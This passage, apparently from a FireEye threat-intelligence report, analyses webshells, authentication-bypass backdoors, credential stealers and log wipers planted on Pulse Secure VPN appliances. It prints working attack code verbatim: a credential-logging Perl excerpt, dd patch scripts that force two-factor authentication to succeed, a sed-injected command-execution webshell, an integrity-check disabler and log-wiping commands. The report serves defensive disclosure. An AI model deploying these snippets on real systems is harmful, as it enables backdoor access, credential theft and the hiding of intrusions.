  logic is still invoked. POST requests have a series of parameters
  checked for existence to determine which command to invoke. This logic is:</p>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="309"><p>
          <b>POST params</b></p> </td> <td width="273"><p>
          <b>Invoked Command</b></p> </td> </tr>
    <tr>
      <td width="309"><p>
          <span class="code">cert</span></p> </td> <td width="273"><p>
          <span class="code">writefile</span></p> </td> </tr>
    <tr>
      <td width="309"><p>
          <span class="code">img, name with nonempty value</span></p>
      </td> <td width="273"><p>
          <span class="code">readfile</span></p> </td> </tr>
    <tr>
      <td width="309"><p>
          <span class="code">img set to empty string &quot;&quot;,
        name</span></p> </td> <td width="273"><p>
          <span class="code">execcmd</span></p> </td> </tr>
    <tr>
      <td width="309"><p>
          <span class="code">anything else</span></p> </td> <td width="273"><p>
          <span class="code">invoke original legitimate logic</span></p>
      </td> </tr></tbody></table>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/pulse-secure/fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Webshells respond to POSTs</span></p>
 <p>All incoming and outgoing requests are base64 encoded/decoded and
  RC4 encrypted/decrypted. The scheme is simple. The first six
  characters of the data are a random key generated per request as a
  sort of nonce, with the static RC4 key appended. This nonce + phrase
  together act as the RC4 key. The phrase is not sent over the wire,
  only the nonce. This entire key is then used to encrypt/decrypt
  payload data that immediately follows the key. The form of data on the
  wire is:</p>
 <p>Outbound/Inbound:</p>
 <p>
  <span class="code">&lt;6randbytes&gt;&lt;encrypted_data&gt;<br />  ^-RC4NONCE-^</span></p>
 <p>Usage:</p>
 <p>
  <span
    class="code">&lt;6randbytes&gt;&lt;rc4_phrase&gt;&lt;encrypted_data&gt;<br />
    ^-------RC4 KEY--------^</span></p>
 <p>
  <i>ReadFile</i></p>
 <p>This command accepts a base64 encoded, RC4 encrypted file name via
  the <span class="code">img</span> parameter and opens it for read. The
  file contents are read in full then sent back to the attacker as
  base64 encoded, RC4 encrypted data with the headers <span
    class="code">&quot;Content-type:
  application/x-download\n&quot;</span>, and form header <span
    class="code">&quot;Content-Disposition: attachment; filename=tmp\n\n&quot;</span>.</p>
 <p>
  <i>WriteFile</i></p>
 <p>This command accepts a base64 encoded, RC4 encrypted filename via
  the <span class="code">cert</span> parameter, and base64 encoded, RC4
  encrypted file data via the parameter <span class="code">md5</span>.
  The filename is opened in write mode with the file data being written
  to the file before the file is closed. The results of this command are
  sent back to the attacker, using the headers <span
    class="code">&quot;Cache-Control: no-cache\n&quot;</span> and <span
    class="code">&quot;Content-type: text/html\n\n&quot;</span>.</p>
 <p>
  <i>Execute</i></p>
 <p>This command accepts a base64 encoded, RC4 encrypted commands via
  the <span class="code">name</span> parameter. The malicious logic
  forbids the <span class="code">cd</span> command and will respond with
  the text <span class="code">Error 404</span> if executed. All other
  commands will be executed via the <span class="code">system</span> API
  with output piped to the file <span class="code">/tmp/1</span>. The
  full system command is <span class="code">&lt;command&gt; &gt;/tmp/1
  2&gt;&amp;1</span>. The output of this execution is read and sent back
  to the attacker base64 encoded, RC4 encrypted. The headers <span
    class="code">&quot;Cache-Control: no-cache\n&quot;</span> and <span
    class="code">&quot;Content-type: image/gif\n\n&quot;</span> are
  used. The response appears to be masquerading as a GIF when sending
  back this command output.</p>
 <h5>RADIALPULSE<i></i></h5>
 <p>The file with the SHA256 hash <span
  class="code">d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b</span>
  is a modified Perl script associated with a PulseSecure web-based tool
  which causes usernames, passwords and information associated with
  logins to this application to be written to the file <span class="code">/tmp/dsstartssh.statementcounters</span>.</p>
 <p>Retrieval of these login credentials must be achieved through other
  means such as an interactive login or a webshell. Persistence is
  achieved by the addition of compromised code which is continually
  served when requesting this PulseSecure webpage.</p>
 <p>An excerpt of the code related to credential stealing is shown as follows:</p>
 <p>
  <span class="code">my $realmName1 = $signin-&gt;getRealmInfo()-&gt;{name};     </span></p>
 <p>
  <span class="code">open(*fd, &quot;&gt;&gt;/tmp/dsstartssh.statementcounters&quot;);      </span></p>
 <p>
  <span class="code">syswrite(*fd, &quot;realm=$realmName1 &quot;,
    5000);         </span></p>
 <p>
  <span class="code">syswrite(*fd, &quot;username=$username &quot;,
    5000);        </span></p>
 <p>
  <span class="code">syswrite(*fd, &quot;password=$password\n&quot;, 5000); </span></p>
 <p>
  <span class="code">close(*fd);</span></p>
 <h5>SLOWPULSE Variant 1<i></i></h5>
 <p>The file <span class="code">libdsplibs.so</span> with SHA256 <span
  class="code">cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68</span>
  is a trojanized ELF shared object belonging to the PulseSecure VPN
  server. The sample has been modified to bypass specific authentication
  mechanisms of the LDAP and RADIUS protocols. The sample hardcodes a
  backdoor key that will silently subvert auth failures if the correct
  backdoor key is passed, establishing a VPN connection as if auth
  succeeded. If the backdoor password is not used, authentication will
  fail as normal.</p>
 <p>In multiple locations assembly is written into the padding regions
  between legitimate functions. As these regions are very small, around
  20 bytes, the malicious logic stitches itself together by
  unconditionally jumping between multiple padding regions. The assembly
  is written in a way very similar to mid-function hooks, where it is
  common to push and then pop all flags and registers before and after
  the injected logic. By preserving registers and flags in this way the
  malicious logic is able to execute and perform its malicious logic as
  a passive observer if desired, only effecting the control flow in
  specific conditions. This is employed in two locations, the LDAP and
  RADIUS authentication routines, <span
  class="code">DSAuth::LDAPAuthServer::authenticate</span> and <span
  class="code">DSAuth::RadiusAuthServer::checkUsernamePassword</span> respectively.</p>
 <p>
  <i>LDAP Auth Bypass</i></p>
 <p>In the typical execution of <span
  class="code">DSAuth::LDAPAuthServer::authenticate</span> the
  legitimate application constructs the C++ object <span
  class="code">DSAuth::LDAPAuthServer::ldap</span> then passes it to
    <span class="code">DSLdapServer::bind</span> with the username and
  password for login. This bind may fail or succeed which determines the
  authentication failure or success of the LDAP protocol. The malicious
  logic inserted into the application redirects execution before <span
  class="code">DSLdapServer::bind</span> just after the ldap object is
  constructed. At this point in execution the username and password are
  easily extracted from memory with mid-function hooking techniques,
  which the sample copies to a code cave in memory between two functions
  as a temporary storage location. The malicious logic then invokes
    <span class="code">DSLdapServer::bind</span> as the normal logic
  would, which sets the return register EAX to 0 or 1 for failure or
  success. A check is then executed where the temporary password copy
  made earlier is checked against a hardcoded backdoor password. If this
  check passes the backdoor logic actives by overwriting EAX to 1 to
  force the application down the execution path of successful
  authentication, even though in reality authentication failed.</p>
 <h5>RADIUS Two Factor Auth Bypass</h5>
 <p>In the typical execution of <span
  class="code">DSAuth::RadiusAuthServer::checkUsernamePassword</span>
  the legitimate application sends a RADIUS-2FA auth packet with
  username and password via <span
  class="code">RadiusAuthPacket::sendRadiusPacket</span>. The response
  is then retrieved and parsed by the routine <span
  class="code">DSAuth::RadiusAuthServer::handleResponse</span>. After
  packet retrieval the packet type is verified to be 3, it's not known
  what this packet type specifies but this is the packet type of a
  successful authentication response. If the packet type check passes,
  then the sample reads a field of the packet that specifies if
  authentication was successful or not and then checks this status
  later. The inserted malicious logic hijacks execution just after <span
  class="code">DSAuth::RadiusAuthServer::handleResponse</span> where the
  password sent to the RADIUS server is checked against a backdoor
  password. If this check passes the malicious logic overwrites the
  retrieved packet with values indicating that it's of type 3 and that
  authentication was successful. The malicious logic then rejoins the
  original execution flow where the packet type is checked. If written
  the spoofed values force the application down the execution path of
  successful authentication, even though in reality authentication failed.</p>
 <h5>SLOWPULSE Variant 2</h5>
 <p>
  <i>ACE Two Factor Auth Credential Logging</i></p>
 <p>We also identified a variant of SLOWPULSE (SHA256: <span
  class="code">1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd</span>)
  which logs credentials used during ACE-2FA protocol authentication.</p>
 <p>The backdoor is implemented in the routine <span
  class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>. As
  part of the login procedure the username and password are retrieved
  then written into a map entry structure. The backdoor inserts an
  unconditional jump into the logon logic that takes this map entry
  structure, reads the username and password fields, then writes them to
  the file <span class="code">/home/perl/PAUS.pm</span> in <span
  class="code">a+</span> (append) mode, using the format string <span
  class="code">%s:%s\n</span>. The backdoor then unconditionally jumps
  back into the normal control flow to continue the logon process as normal.</p>
 <h5>SLOWPULSE Variant 3</h5>
 <p>
  <i>ACE Two Factor Auth Bypass</i></p>
 <p>We Identified another variant of SLOWPULSE (SHA256: <span
  class="code">b1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9</span>)
  which is similar to SLOWPULSE VARIANT 2 the malicious logic lives
  within <span
  class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>,
  however this variant bypasses the logon procedure rather than login
  credentials. Typical execution of this routine calls <span
  class="code">DsSecID_checkLogin</span> to validate the username and
  password which sets the EAX register to 1. The routine <span
  class="code">DSAuth::AceAuthServer::handleACEAuthResult</span> then
  checks EAX to determine if auth was successful or not. The malicious
  logic hijacks execution immediately after the username and password
  fields are written to their map entries, then checks if the password
  matches the backdoor password. If the password matches, then the EAX
  register is overwritten to 1. This puts the program in the same state
  as if <span class="code">DsSecID_checkLogin</span> had successfully
  executed, but unlike SLOWPULSE VARIANT 1 the original authentication
  routine is not called at all. The malicious logic then rejoins
  execution before <span
  class="code">DSAuth::AceAuthServer::handleACEAuthResult</span> which
  will now pass. This forces the application down the execution path of
  successful authentication, even though in reality authentication would
  have failed.</p>
 <h5>SLOWPULSE Variant 4</h5>
 <p>
  <i>RealmSignin Two Factor Auth Bypass</i></p>
 <p>We identified a fourth variant of SLOWPULSE responsible for
  bypassing what may be the two-factor authentication step of the <span
  class="code">DSAuth::RealmSignin</span> process. The backdoor is
  present within the function <span
  class="code">DSAuth::RealmSignin::runSigninStep</span>.This routine is
  responsible for multiple steps of the login procedure and is
  implemented as a large switch statement. Case 11 of the switch
  statement typically calls the routines <span
  class="code">DSMap::setPrivacyKeyNames</span> then <span
  class="code">DSAuth::RealmSignin::runSecondaryAuth</span>. The
  malicious logic in this variant overwrites the call to
  DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces
  application flow as if DSAuth::RealmSignin::runSecondaryAuth always
  succeeds, without ever calling it. We were not able to recover a file
  with these patches applied as the attacker removed their patches after
  use. However, we did uncover both the patcher and unpatcher utilities.
  We do not provide a hash for this file as we have not recovered it
  from a system in the field. This analysis was performed by replaying
  the changes performed by the patcher we did recover.</p>
 <h5>SLOWPULSE Variant 2 Patcher</h5>
 <p>As part of our investigation into the SLOWPULSE family we were able
  to recover the utility used by the attacker to insert the malicious
  logic into the original <span class="code">libdsplibs.so</span> file.
  The file with SHA256: <span
  class="code">c9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c</span>
  is responsible for inserting SLOWPULSE V2 malicious logic to log ACE
  credentials. The patcher accepts two command line arguments, the path
  to the original binary and the patched output file path. The original
  binary is read into memory, patched, and then written to the output
  path. The assembly patches and offsets into the original binary are hardcoded.</p>
 <h5>SLOWPULSE Variant 3 Patcher</h5>
 <p> As part of our investigation into the SLOWPULSE family we were able
  to recover the utility used by the attacker to insert the malicious
  logic into the original <span class="code">libdsplibs.so</span> file.
  The file with SHA256: <span
  class="code">06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7</span>
  is responsible for inserting SLOWPULSE V3 malicious logic to bypass
  ACE logon authentication process. The patcher accepts four arguments.
  The first argument is the original binary path, the second the patched
  output file path, third is the backdoor bypass password, and fourth is
  the letter e specifying to apply patches. The sample reads the
  original binary into memory, applies the assembly patches associated
  with SLOWPULSE V3, as well as the provided bypass password, then
  written to the output path. The assembly patches, and all offsets
  including where to copy the bypass password are hardcoded.</p>
 <h5>SLOWPULSE Variant 4 Patcher</h5>
 <p>As part of our investigation into the SLOWPULSE family we recovered
  the utility the attacker used to insert the malicious logic into the
  original <span class="code">libdsplibs.so</span> file. The file with
  SHA256: <span
  class="code">e63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415</span>
  responsible for inserting the patch for SLOWPULSE V3. The patch
  applied overwrites a single call to <span
  class="code">DSAuth::RealmSignin::runSecondaryAuth</span> with <span
    class="code">mov eax, 1</span>. This patcher utility is a simple
  bash script, unlike the previous patchers which were compiled
  applications likely written in C. The script in full is:</p>
 <p>
  <span class="code">printf '\xB8' | dd conv=notrunc
    of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))<br />
    printf '\x01' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1
    count=1 seek=$((0x5C7B32))<br />  printf '\x00' | dd conv=notrunc
    of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))<br />
    printf '\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1
    count=1 seek=$((0x5C7B34))<br />  printf '\x00' | dd conv=notrunc
    of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))</span></p>
 <h5>SLOWPULSE Variant 4 UnPatcher</h5>
 <p>As part of our investigation into the SLOWPULSE family we were able
  to recover the utility used by the attacker to remove the malicious
  logic into the original <span class="code">libdsplibs.so</span> file
  for SLOWPULSE V4. The attacker chose to remove the patches applied to
    <span class="code">libdsplibs.so</span>. The file with SHA256: <span
  class="code">b2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a</span>
  is the unpatcher utility for SLOWPULSE V4. This sample is also a
  simple bash script, in full it is:</p>
 <p>
  <span class="code">printf '\xE8' | dd conv=notrunc
    of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))<br />
    printf '\xE2' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1
    count=1 seek=$((0x5C7B32))<br />  printf '\x08' | dd conv=notrunc
    of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))<br />
    printf '\xD0' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1
    count=1 seek=$((0x5C7B34))<br />  printf '\xFF' | dd conv=notrunc
    of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))</span></p>
 <h5>STEADYPULSE</h5>
 <p>The file <span class="code">licenseserverproto.cgi</span> (SHA256:
    <span
  class="code">168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc</span>)
  is a webshell implemented via modification of a legitimate Perl script
  used by a Pulse Secure tool which enables arbitrary command execution.</p>
 <p>The attacker inserted two blocks of Perl code that implement the
  webshell. The source code modifications are surrounded by comments
  that indicate the start and end of inserted code. The comment strings
  used are <span class="code">##cgistart1</span>, <span
  class="code">##cgiend1</span>, <span class="code">##cgistart2</span>
  and <span class="code">##cgiend2</span>. Although the exact purpose of
  these comment strings is unknown, the attacker may use them to
  facilitate updates to the malicious code or to allow for its quick
  removal if necessary.</p>
 <ul> <li>The Perl script enclosed in the tags <span
    class="code">##cgistart1</span> and <span
    class="code">##cgiend1</span> adds several lines to import Perl
    modules that are used by the webshell. It also adds a function to
    parse parameters of received command data.</li> <li>The script
    enclosed in the tags <span class="code">##cgistart2</span> and <span
    class="code">##cgiend2</span> is responsible for checking web
    requests designed to be executed by the webshell, if present. If no
    webshell request is found, the script passes execution to the
    legitimate Perl script for the webpage.</li> </ul>
 <p>The webshell portion of the script is invoked when it receives a
  form submission <span class="code">name=value</span> pair of <span
  class="code">serverid</span> matching a secret key. This causes the
  webshell to extract the string passed to it via the <span
  class="code">QUERY_STRING</span> CGI environment variable. Individual
  key/value pairs delimited by the <span class="code">&amp;</span>
  character and are URL decoded. Although the script parses out all
  key/value pairs it receives, it specifically looks for and extracts
  data associated with the cmd parameter. If found, it will generate a
  form containing the extracted cmd to be executed and the previous
    <span class="code">serverid</span> value along with a form
  submission button named <span class="code">Run</span>. Upon
  submission, the webshell will execute the passed command on the victim
  host's command line and display the results to the attacker before
  exiting. If no cmd value was extracted, the webshell will simply
  output a <span class="code">&lt;/pre&gt;</span> HTML tag.</p>
 <h5>PULSECHECK<i></i></h5>
 <p>The file <span class="code">secid_canceltoken.cgi</span> (SHA256:
    <span
  class="code">a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1</span>)
  is a webshell written in Perl that enables arbitrary command
  execution. With a properly formatted request, the script will execute
  webshell code. Otherwise, the legitimate welcome page of the Pulse
  Secure VPN software is presumably invoked.</p>
 <p>The script checks for web requests using the HTTP POST method and,
  if found, will further check the HTTP request headers for the CGI
  environment variable <span class="code">HTTP_X_KEY</span>. If this
  header matches a backdoor key, then the malware will output the result
  of the command sent in the variable <span
  class="code">HTTP_X_CMD</span>. This data is RC4 encrypted and
  base64-encoded. The passphrase to decrypt is sent in the environment
    variable <span class="code">HTTP_X_CNT</span>. The webshell will set
  the content type to <span
  class="code">Content-type:text/html</span> and the command output
  printed. Following this, the script exits.</p>
 <h5>QUIETPULSE<i></i></h5>
 <p>The file <span class="code">dsserver</span> (SHA256: <span
  class="code">9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd</span>)
  is a legitimate Perl script with malicious modifications to fork the
  child process <span class="code">/home/bin/dshelper</span>. The
  dshelper script does not exist on a clean PulseSecure installation,
  this file is described as QUIETPULSE Utility Script.</p>
 <h5>QUIETPULSE Utility Script<i></i></h5>
 <p>The file <span class="code">dshelper</span> (SHA256: <span
  class="code">c774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4</span>)
  is a shell script invoked by a malicious version of <span
  class="code">dsserver</span> that primarily functions as a utility
  script responsible for copying files and executing commands. Like the
  ATRIUM patcher, this script accesses /tmp/data, a path which is used
  during a system upgrade. This file is therefore, like the ATRIUM
  patcher, used by the attacker to maintain persistence. The script is
  set to execute in a loop where four main checks are executed every two
  minutes. The checks are as follows:</p>
 <p>
  <i>Check 1</i></p>
 <p>If <span
  class="code">/tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span>
  exists and is non-empty then execute:</p>
 <ul> <li>
    <span class="code">grep -c -s 'system($depara)'
  /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li> </ul>
 <p>It checks if the file has the contents <span
  class="code">system($depara)</span>. If the file does not contain this
  content, then retrieve the first line of the file by executing:</p>
 <ul> <li>
    <span class="code">sed -n 1p
  /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li> </ul>
 <p>Then copy a file via:</p>
 <ul> <li>
    <span class="code">cp
      /home/webserver/htdocs/dana-na/auth/compcheckjava.cgi
  /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li> </ul>
 <p>Then replace the copy’s first line with the one retrieved from the
  sed above via:</p>
 <ul> <li>
    <span class="code">sed -i 1c&quot;&lt;varies&gt;&quot;
  /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li> </ul>
 <p>
  <i>Check 2</i></p>
 <p>If <span class="code">/tmp/data/root/home/bin/</span> exists as a
  directory, then check if the file <span
  class="code">/tmp/data/root/home/bin/dshelper</span> does not exist.
  If it does not exist, then place it there by copying a file via:</p>
 <ul> <li>
    <span class="code">cp -p /home/bin/dshelper
  /tmp/data/root/home/bin/</span></li> </ul>
 <p>
  <i>Check 3</i></p>
 <p>If <span class="code">/tmp/data/root/home/bin/dsserver</span> exists
  and is non-empty then execute the following to check if the file does
  not contain the string <span class="code">exec(&quot;/home/bin/dshelper&quot;)</span>:</p>
 <ul> <li>
    <span class="code">grep -c -s 'exec(&quot;/home/bin/dshelper&quot;)'
  /tmp/data/root/home/bin/dsserver</span></li> </ul>
 <p>If it doesn't then execute to insert the line:</p>
 <ul> <li>
    <span class="code">sed -i 's/for (;;)/my $monpid = fork();\nif
      ($monpid == 0)
      {\nexec(\&quot;\/home\/bin\/dshelper\&quot;);\n}\n&amp;/g'
  /tmp/data/root/home/bin/dsserver</span></li> </ul>
 <p>
  <i>Check 4</i></p>
 <p>If the file <span
  class="code">/tmp/data/root/home/bin/check_integrity.sh</span> exists
  and is non-empty, then check if the file contains the string <span
    class="code">exit 1</span> by executing:</p>
 <ul> <li>
    <span class="code">grep -c -s 'exit 1'
  /tmp/data/root/home/bin/check_integrity.sh</span></li> </ul>
 <p>If the file does contain this content, then execute the following to
  switch the content to <span class="code">exit 0</span>:</p>
 <ul> <li>
    <span class="code">sed -i 's/exit 1/exit 0/g'
  /tmp/data/root/home/bin/check_integrity.sh</span></li> </ul>
 <h5>PULSEJUMP</h5>
 <p>The file with SHA256: <span
  class="code">7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a</span>
  is a system information and credential harvesting Perl script. The
  sample writes information from multiple sources to the file <span
  class="code">/tmp/dsactiveuser.statementcounters</span> in append mode.</p>
 <p>The sample begins by retrieving all auth servers via the API <span
  class="code">AuthAdmin::getAllAuthServers</span>. and logs the
  results. Next, the sample logs all roles via the API <span
  class="code">DSRole::GeneralAdmin::getRoles</span> and writes the
  values to the file. The sample may also retrieve and log additional
  information depending on the device configuration.</p>
 <h5>HARDPULSE</h5>
 <p>The file <span class="code">compcheckjava.cgi</span> (SHA256: <span
  class="code">1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc</span>)
  has the ability to read and write arbitrary files and may execute
  arbitrary commands depending on the implementation of a particular
  library function.</p>
 <p>The sample responds to HTTP GETs and PUTs. The GET path is not
  relevant, but the PUT path first checks if the incoming requests <span
  class="code">checkcode</span> POST param is equal to a hardcoded
  passcode. If this check passes the sample inspects the param <span
  class="code">hashid</span> to determine if it's non-empty. If
  non-empty the sample displays a prompt to the user that includes
  hardware information and then base64 decodes the param <span
  class="code">hashid</span> and checks it against pulsesecure. If this
  matches a recoveryToken is generated which is the MD5 hash of 16
  random bytes, with the result hash truncated to 8 characters. This
  token is then displayed to the user via the URL <span
  class="code">https://ive-host/dana-na/auth/recover[.]cgi?token=&lt;varies&gt;</span>
  and the sample exits. If this check did not match then the sample
  passes the base64 decoded data to a routine <span
  class="code">DSSafe::psystem</span> which may execute shell commands,
  however this implementation is not provided and is speculation.</p>
 <p>If the param hashid is empty the sample instead checks that the
  param <span class="code">m</span> is non-empty. If so, it's matched
  against get and put which will read/write arbitrary files to the host, respectively.</p>
 <h5>ATRIUM</h5>
 <p>The file <span class="code">compcheckresult.cgi</span> (SHA256:
    <span
  class="code">f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90</span>)
  is a webshell capable of arbitrary command execution. The sample has
  malicious logic inserted at the end of legitimate logic. The malicious
  logic inspects all requests of any type looking for the HTTP query
  parameter <span class="code">id</span>. If this query parameter
  exists, the sample executes it verbatim on using the <span
  class="code">system</span> API. The sample does not encode or
  obfuscate the command in any way. If the query parameter is not found
  in the request, then the original legitimate logic is invoked.</p>
 <h5>Persistence Patcher</h5>
 <p>The file <span class="code">DSUpgrade.pm</span> (SHA256: <span
  class="code">224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450</span>)
  is a patcher utility script responsible for persisting webshells
  across a system upgrade. We’ve observed variants of this utility
  targeting the persistence of multiple webshell families, notably
  ATRIUM, STEADYPULSE, and PULSECHECK. Like previous patchers, this
  sample uses <span class="code">sed</span> to insert malicious logic.
  The attacker likely chose <span class="code">DSUpgade.pm</span> to
  host their patch logic as it is a core file in the system upgrade
  procedure, ensuring the patch is during updates. The patcher modifies
  content in <span class="code">/tmp/data</span> as this directory holds
  the extracted upgrade image the newly upgraded system will boot into.
  This results in a persistence mechanism which allows the attacker to
  maintain access to the system across updates.</p>
 <p>
  <span class="code">my $cmd_x=&quot;sed -i '/echo_console \&quot;Saving
    package\&quot;/i(<br />      sed -i
    \\\'/main();\\\$/cif(CGI::param(\\\\\&quot;id\\\\\&quot;)){<br />   
          print \\\\\&quot;Cache-Control:
    no-cache\\\\\\\\n\\\\\&quot;;<br />          print
    \\\\\&quot;Content-type:
    text/html\\\\\\\\n\\\\\\\\n\\\\\&quot;;<br />          my
    \\\\\$na=CGI::param(\\\\\&quot;id\\\\\&quot;);<br />         
    system(\\\\\&quot;\\\\\$na\\\&quot;);<br />      } else{<br />     
        &amp;main();<br />      }\\\' /tmp/data/root$cgi_p;<br />     
    cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;<br />     
    cp -f /pkg/dspkginstall /tmp/data/root/pkg/;<br />  )'/pkg/do-install&quot;;</span></p>
 <p>The patcher also performs additional shell commands for unpacking a
  compressed package:</p>
 <p>
  <span class="code">system(&quot;/bin/mount -o remount,rw /dev/root
    /&quot;);<br />  system(&quot;/bin/tar&quot;, &quot;-xzf&quot;,
    &quot;/tmp/new-pack.tgz&quot;, &quot;-C&quot;,
    &quot;/tmp&quot;,&quot;./installer&quot;);<br />  system(&quot;cp -f
    /tmp/installer/do-install /pkg/&quot;);<br />  system(&quot;cp -f
    /tmp/installer/VERSION /pkg/&quot;);<br />  system(&quot;cp -f
    /tmp/installer/sysboot-shlib /pkg/&quot;);<br />  system(&quot;cp -f
    /tmp/installer/losetup /pkg/&quot;);</span></p>
 <h5>PACEMAKER</h5>
 <p>The file <span class="code">memread</span> (SHA256: <span
  class="code">68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2</span>)
  is a credential stealer. The sample has the usage information:</p>
 <p>
  <span class="code">Usage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)]</span></p>
 <p>The sample starts by setting an alarm that kills the application
  after a configurable number of minutes, 14 by default. It then enters
  a loop which reads <span class="code">/proc/</span> entries every 2
  seconds looking for a target application, this interval is also
  configurable. The target is found by opening <span
  class="code">/proc/&lt;process_name&gt;/cmdline</span> for each entry
  in the folder and then reading this file looking for the string <span
  class="code">dswsd</span> within the command line. Once found the
  target application's <span
  class="code">proc/&lt;target_pid&gt;/mem</span> is opened, the process
  is attached to with PTRACE, then memory read in chunks up to 512 bytes
  in size. For each chunk, the string <span class="code">20 30 20 0A 00
    ( 0 \n)</span> is searched for as a needle. If found the sample
  splits the data by first space, then a dash -. Two dashes are expected
  to be found, and these are immediately converted into hex numbers,
  example form: -&lt;number&gt;. If the second number minus the first is
  &gt; 8191 the sample reads the data starting at the file offset of the
  first number, up to a size specified by second number minus first number.</p>
 <p>Once the sample has read the process memory and found all memory
  data of interest the sample detaches PTRACE then the sample begins
  memory scanning the copied data. The sample tries to locate a sequence
  of 'flags' in memory one by one to locate what seem to be information
  the attacker wishes to steal. This information is not known, nor is
  the structure of it. The sequences scanned for generally have start
  and end scan sequences which in order scanned for, are:</p>
 <p>
  <span class="code">USER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65
    05 01 3E 05 00<br />  USER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61
    6D 65 05 01 3E 00<br />  PASSWORD_START_FLAG: 3C 05 08 70 61 73 73
    77 6F 72 64 05 01 3E 00<br />  PASSWORD_END_FLAG: 3C 2F 05 08 70 61
    73 73 77 6F 72 64 05 01 3E 00<br />  AUTHNUM_START_FLAG: 3C 05 0A 61
    75 74 68 4E 75 6D 62 65 72 05 01 3E 00<br />  AUTHNUM_END_FLAG: 3C
    2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00</span></p>
 <p>If all these sequences are found, the data between the start and end
  is extracted and eventually formatted and written to the file <span
  class="code">/tmp/dsserver-check.statementcounters</span>. The
  approximate format of this data is:</p>
 <p>
  <span class="code">Name:&lt;username&gt; || Pwd:&lt;password&gt; || AuthNum:&lt;authnumber&gt;\n</span></p>
 <p>The sample replaces the following URL encoded values with their
  ascii representation for the password:</p>
 <p>
  <span class="code">&amp;amp; -&gt;  &amp;<br />  &amp;lt;  -&gt; 
    &lt;<br />  &amp;gt;  -&gt;  &gt;</span></p>
 <h5>PACEMAKER Launcher Utility</h5>
 <p>As part of our investigation into PACEMAKER we were able to retrieve
  a simple bash script responsible for launching the credential stealer.
  The launcher script hash SHA256 <span
  class="code">4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec</span>
  launches PACEMAKER from a hardcoded path with options specifying a
  16MB memory read size and a memory scan interval of 2 seconds, with a
  variable self-kill time.</p>
 <p>
  <span class="code">#!/bin/bash</span></p>
 <p>
  <span class="code">/home/bin/memread -t $1 -m 16 -s 2 &amp;</span></p>
 <h5>THINBLOOD Log Wiper Utility</h5>
 <p>The file <span class="code">dsclslog</span> with SHA256 <span
  class="code">88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079</span>
  is a log wiper utility. The sample provides the usage information:</p>
 <p>
  <span class="code">Usage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...]</span></p>
 <p>The <span class="code">–f</span> flag specifies if the file <span
  class="code">log.events.vc0</span> or <span
  class="code">log.access.vc0</span> within the directory <span
  class="code">/home/runtime/logs</span> should be modified. To perform
  its log cleaning operations the sample first makes two copies of
  whichever log file was chosen, but uses <span class="code">.vc1</span>
  and <span class="code">.vc2</span> as the extension for the new files.
  The file with the <span class="code">.vc1</span> is used to search for
  entries that match the given entries, and the file with the <span
  class="code">.vc2</span> extension is used as a temporary file where
  the cleaned log is written. After generating both files and log
  cleaning is finished the sample executes the following commands via
  the system API to overwrite the original log with the cleaned version,
  then removes the intermediate:</p>
 <p>
  <span class="code">mv /home/runtime/logs/log.&lt;logtype&gt;.vc2<br />
    /home/runtime/logs/log.&lt;logtype&gt;.vc0<br />  rm /home/runtime/logs/log.&lt;logtype&gt;.vc1</span></p>
 <h5>THINBLOOD LogWiper Utility Variant</h5>
 <p>The file <span class="code">clear_log.sh</span> (SHA256: <span
  class="code">1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9</span>)
  is a BASH script responsible for zeroing log lines that match a given
  regex pattern. The sample is similar to the compiled <span
